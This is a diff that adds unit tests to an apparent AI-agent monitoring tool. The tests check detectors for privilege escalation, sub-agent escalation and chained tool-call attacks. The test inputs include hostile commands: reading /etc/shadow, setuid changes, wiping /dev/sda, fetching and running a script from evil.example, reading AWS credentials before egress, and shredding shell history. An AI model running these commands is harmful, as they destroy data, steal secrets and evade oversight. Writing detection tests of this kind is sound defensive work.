@@ -677,3 +677,142 @@ class TestNetworkTunnelSignalsDetector:
                 1 for f in findings if f.detector_id == "network_tunnel"
             )
         assert volume_findings == 1
+
+
+# -- Elevation widening, sub-agent escalation, tool-chain composition ------
+
+class TestElevationCoverage:
+    """Privilege-escalation matching beyond first-token sudo/su/runas."""
+
+    def test_policy_flags_non_first_token_sudo(self) -> None:
+        from agenttrace.models.task_contract import TaskContract
+        from agenttrace.security.policy import PolicyEngine
+
+        engine = PolicyEngine(uuid4(), TaskContract(session_id=uuid4(), goal="t"))
+        event = CommandEvent(
+            actor_id="test",
+            session_id=uuid4(),
+            source_adapter="test",
+            command="env SUDO_ASKPASS=/tmp/askpass.sh sudo cat /etc/shadow",
+        )
+        result = engine.evaluate(event)
+        assert any(r.rule_id == "privilege_escalation" for r in result.triggered_rules)
+
+    def test_policy_flags_doas_and_runas_verb(self) -> None:
+        from agenttrace.models.task_contract import TaskContract
+        from agenttrace.security.policy import PolicyEngine
+
+        engine = PolicyEngine(uuid4(), TaskContract(session_id=uuid4(), goal="t"))
+        for cmd in ("doas pacman -Syu", "powershell -c Start-Process notepad -Verb RunAs"):
+            result = engine.evaluate(
+                CommandEvent(
+                    actor_id="test", session_id=uuid4(),
+                    source_adapter="test", command=cmd,
+                )
+            )
+            assert any(r.rule_id == "privilege_escalation" for r in result.triggered_rules), cmd
+
+    def test_detector_flags_elevation_tooling(self) -> None:
+        engine = _engine()
+        findings = engine.evaluate(_command("pkexec sh -c 'chmod u+s /bin/dash'"))
+        assert any(f.detector_id == "privilege_change" for f in findings)
+
+
+class TestSubagentPrivilegeDetector:
+    def _process(self, cmd: str, descendant: bool) -> ProcessEvent:
+        return ProcessEvent(
+            actor_id="process_tree_observer",
+            session_id=uuid4(),
+            source_adapter="process_tree_observer",
+            pid=4321,
+            ppid=1234,
+            command_line=cmd,
+            payload={
+                "process_name": "sh",
+                "contained_descendant": descendant,
+            },
+        )
+
+    def test_flags_descendant_running_elevation_tooling(self) -> None:
+        engine = _engine()
+        findings = engine.evaluate(self._process("sudo dd if=/dev/zero of=/dev/sda", True))
+        assert any(f.detector_id == "subagent_privilege_escalation" for f in findings)
+
+    def test_does_not_flag_top_level_or_unrelated_processes(self) -> None:
+        engine = _engine()
+        # Same command but NOT a tracked descendant: no relational claim.
+        assert all(
+            f.detector_id != "subagent_privilege_escalation"
+            for f in engine.evaluate(self._process("sudo ls /root", False))
+        )
+
+
+class TestToolChainDetector:
+    def test_fetch_then_execute_split_across_calls(self) -> None:
+        engine = _engine()
+        engine.evaluate(_command("curl -sL https://evil.example/x.sh -o /tmp/x.sh"))
+        findings = engine.evaluate(_command("bash /tmp/x.sh"))
+        assert any(
+            f.detector_id == "benign_tool_chain"
+            and f.description.startswith("Downloaded content")
+            for f in findings
+        )
+
+    def test_secret_read_then_egress(self) -> None:
+        engine = _engine()
+        engine.evaluate(_command("cat ~/.aws/credentials"))
+        net = NetworkEvent(
+            actor_id="test",
+            session_id=uuid4(),
+            source_adapter="test",
+            destination_ip="8.8.8.8",
+            destination_port=443,
+            protocol="tcp",
+        )
+        findings = engine.evaluate(net)
+        assert any(
+            f.detector_id == "benign_tool_chain"
+            and f.description.startswith("Credential material")
+            for f in findings
+        )
+
+    def test_escalate_then_cleanup(self) -> None:
+        engine = _engine()
+        engine.evaluate(_command("sudo chmod 4755 /usr/bin/env"))
+        findings = engine.evaluate(_command("shred ~/.bash_history"))
+        assert any(
+            f.detector_id == "benign_tool_chain"
+            and f.description.startswith("Anti-forensic cleanup")
+            for f in findings
+        )
+
+    def test_benign_sequences_do_not_fire(self) -> None:
+        engine = _engine()
+        engine.evaluate(_command("curl https://pypi.org/simple/ -o index.html"))
+        engine.evaluate(_command("pytest tests/"))
+        assert not any(f.detector_id == "benign_tool_chain" for f in engine.evaluate(
+            _command("git status")
+        ))
+
+    def test_each_recipe_fires_once_per_session(self) -> None:
+        engine = _engine()
+        session = uuid4()
+
+        def cmd(c: str) -> CommandEvent:
+            return CommandEvent(
+                actor_id="test", session_id=session, source_adapter="test", command=c
+            )
+
+        engine.evaluate(cmd("cat ~/.aws/credentials"))
+        net1 = NetworkEvent(
+            actor_id="test", session_id=session, source_adapter="test",
+            destination_ip="8.8.8.8", destination_port=443, protocol="tcp",
+        )
+        assert any(f.detector_id == "benign_tool_chain" for f in engine.evaluate(net1))
+
+        # Same composition again: deduped — no second chain finding.
+        net2 = NetworkEvent(
+            actor_id="test", session_id=session, source_adapter="test",
+            destination_ip="1.1.1.1", destination_port=443, protocol="tcp",
+        )
+        assert not any(f.detector_id == "benign_tool_chain" for f in engine.evaluate(net2))
